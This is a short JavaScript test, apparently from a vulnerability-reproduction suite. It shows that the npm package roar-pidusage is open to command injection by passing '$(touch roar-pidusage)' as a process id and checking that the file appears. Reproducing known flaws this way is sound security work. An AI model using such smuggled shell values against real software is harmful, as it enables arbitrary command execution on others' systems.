//no error but no output seen
//https://snyk.io/vuln/npm:roar-pidusage
test("Command Injection in roar-pidusage", () => 
{
    const roar_pidusage = require('roar-pidusage');
	const fs = require('fs')
	const path = './roar-pidusage'
	const sleep = require('sleep');
	
	
    roar_pidusage.stat('$(touch roar-pidusage)', function(){});
	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});

